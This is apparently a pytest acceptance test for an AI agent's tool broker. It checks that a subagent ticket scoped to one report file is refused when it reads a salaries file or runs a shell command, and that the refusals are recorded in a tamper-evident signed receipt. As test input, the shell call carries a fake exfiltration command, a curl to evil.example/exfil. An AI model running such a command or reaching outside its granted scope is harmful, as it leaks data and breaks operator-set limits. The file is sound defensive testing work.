"""The M17 "Done when" acceptance test [ADR-0039, ROADMAP.md]: a subagent
ticketed to one file cannot read another, or use `shell` to reach a host
outside its scope, and the receipt tells that story afterwards.

1. A ticket scoped `paths=reports/q3.md`.
2. A `read` outside that path is refused. `shell` has no path or host of its
   own to check against `paths=`, so it is refused outright too (the
   "unchecked" branch in `authorize()`) -- the deliberate cost of scoping to
   files, not a loophole for reaching a host `paths=` never named.
3. Both refusals land in the signed receipt; the chain still verifies, and
   `edgar receipt --refused` / `--verify` tell the same story from the CLI.
"""

from __future__ import annotations

import asyncio
from pathlib import Path

import pytest
from harness import Recorder, guard, tool_use

from edgar.broker.caveats import parse_scope
from edgar.broker.cli import command
from edgar.broker.guard import TicketGuard
from edgar.broker.receipt import Receipts, load_or_create_key, verify
from edgar.broker.ticket import Ticket
from edgar.core.events import EventBus, ScopeRefused
from edgar.core.message import Message, TextBlock, ToolResultBlock
from edgar.core.session import Session
from edgar.storage.transcript import start
from edgar.tools.base import ToolContext
from edgar.tools.execute import execute
from edgar.tools.registry import core_registry


def _scoped_session(tmp_project: Path, home: Path) -> tuple[Session, ToolContext, Recorder]:
    # 1. A session findable by `edgar receipt`, and a ticket that only names
    #    one file -- everything else this call stack tries is out of scope.
    reports = tmp_project / "reports"
    reports.mkdir()
    (reports / "q3.md").write_text("Q3 numbers\n", encoding="utf-8")
    (reports / "2024-salaries.md").write_text("salaries: secret\n", encoding="utf-8")

    session = start(Session(cwd=tmp_project, model="fake/test", mode="ask"))
    session.append(Message("user", (TextBlock("hello"),)))  # so its transcript file exists

    bus = EventBus()
    recorder = Recorder()
    bus.subscribe(Receipts(path=session.dir / "receipt.jsonl", key=load_or_create_key(home)))
    bus.subscribe(recorder)

    ticket = Ticket(intent_id="i1", caveats=parse_scope(["paths=reports/q3.md"]))
    ctx = ToolContext(
        cwd=tmp_project,
        bus=bus,
        blob_dir=tmp_project / ".edgar" / "blobs",
        max_output_tokens=8_000,
        broker=TicketGuard(ticket),
    )
    return session, ctx, recorder


async def _call(name: str, args: dict[str, object], ctx: ToolContext, cwd: Path) -> ToolResultBlock:
    gate = guard(cwd, "read-only")
    return await execute(
        tool_use(name, args), registry=core_registry(), ctx=ctx, guard=gate, mode="read-only"
    )


def test_a_ticket_scoped_to_one_file_stops_a_read_and_a_shell_escape(
    tmp_project: Path, home: Path
) -> None:
    session, ctx, recorder = _scoped_session(tmp_project, home)

    read_result = asyncio.run(_call("read", {"path": "reports/2024-salaries.md"}, ctx, tmp_project))
    shell_result = asyncio.run(
        _call("shell", {"command": "curl https://evil.example/exfil"}, ctx, tmp_project)
    )

    assert read_result.is_error and read_result.error and read_result.error.kind == "out_of_scope"
    assert (
        shell_result.is_error and shell_result.error and shell_result.error.kind == "out_of_scope"
    )
    assert [r.caveat for r in recorder.of(ScopeRefused)] == ["paths", "paths"]

    assert verify(session.dir / "receipt.jsonl", load_or_create_key(home)) is None


def test_the_two_refusals_show_up_through_edgar_receipt(
    tmp_project: Path, home: Path, capsys: pytest.CaptureFixture[str]
) -> None:
    session, ctx, _ = _scoped_session(tmp_project, home)
    asyncio.run(_call("read", {"path": "reports/2024-salaries.md"}, ctx, tmp_project))
    asyncio.run(_call("shell", {"command": "curl https://evil.example/exfil"}, ctx, tmp_project))

    assert command([session.id, "--refused"], tmp_project, home) == 0
    out = capsys.readouterr().out
    assert out.count("refuse: ") == 2
    assert "'caveat': 'paths'" in out

    assert command(["--verify"], tmp_project, home) == 0
    assert "every line still holds" in capsys.readouterr().out

    path = session.dir / "receipt.jsonl"
    path.write_text(path.read_text().replace("shell", "shull"))  # one byte off, still valid JSON
    assert command(["--verify"], tmp_project, home) == 1
    assert "line" in capsys.readouterr().err
